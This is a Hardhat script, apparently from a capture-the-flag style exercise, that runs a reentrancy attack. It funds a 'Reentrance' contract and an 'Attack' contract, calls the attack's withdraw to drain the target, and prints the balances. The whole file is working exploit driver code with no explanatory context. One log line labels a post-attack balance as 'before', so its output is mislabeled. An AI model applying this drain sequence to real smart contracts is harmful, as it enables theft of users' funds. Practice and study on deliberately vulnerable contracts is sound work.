const hre = require('hardhat');

async function main() {
  const [owner] = await ethers.getSigners();
  const provider = ethers.provider;

  const reentrance = await ethers.getContractAt(
    'Reentrance',
    process.env.REENTRANCE_ADDRESS
  );
  const attack = await ethers.getContractAt(
    'Attack',
    process.env.ATTACK_ADDRESS
  );

  await (
    await reentrance.donate(owner.address, {
      value: ethers.utils.parseEther('10'),
    })
  ).wait();

  await (
    await reentrance.donate(attack.address, {
      value: ethers.utils.parseEther('1'),
    })
  ).wait();

  await (
    await owner.sendTransaction({
      to: attack.address,
    })
  ).wait();

  await (await attack.withdraw()).wait();

  console.log(
    `Attacker balance before :>> ${ethers.utils.formatEther(
      (await provider.getBalance(owner.address)).toString(),
      '1'
    )}`
  );
  console.log(
    `Reentrance Contract balance :>> ${ethers.utils.formatEther(
      (await provider.getBalance(reentrance.address)).toString()
    )}`
  );
  console.log(
    `Attack Contract balance :>> ${ethers.utils.formatEther(
      (await provider.getBalance(attack.address)).toString()
    )}`
  );
  console.log(
    `Attacker balance after :>> ${ethers.utils.formatEther(
      (await provider.getBalance(owner.address)).toString()
    )}`
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
